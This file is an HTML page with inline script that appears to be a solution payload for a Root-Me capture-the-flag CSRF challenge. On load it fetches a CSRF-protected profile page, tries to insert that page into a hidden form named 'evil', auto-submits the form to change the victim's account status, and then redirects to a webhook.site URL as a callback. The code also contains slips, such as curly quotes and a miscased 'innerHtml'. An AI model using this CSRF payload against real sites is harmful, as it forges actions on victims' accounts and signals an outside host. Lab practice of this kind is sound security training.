<html>
  <body>
    <form id='evil' action="http://challenge01.root-me.org/web-client/ch22/?action=profile" enctype="multipart/form-data" method="POST">
      <div id="drop"></div>
      <input name="username" value="test">
      <input type="checkbox" name="status" checked>
    </form>
    <script>
      window.addEventListener('DOMContentLoaded', function () {
        var csrfProtectedPage = ’http://challenge01.root-me.org/web-client/ch23/?action=profile’;
        var html = get(csrfProtectedPage);
        document.getElementById('drop').innerHtml = html;
        
        document.getElementById('evil').submit();
        setTimeout(() => document.location = 'https://webhook.site/ffa22a63-e517-4166-8d91-da9997e12d7f?visited', 4000);

        function get(url) {
          var xmlHttp = new XMLHttpRequest();
          xmlHttp.open("GET", url, false);
          xmlHttp.send(null);
          return xmlHttp.responseText;
        }
      });
    </script>
  </body>
</html>
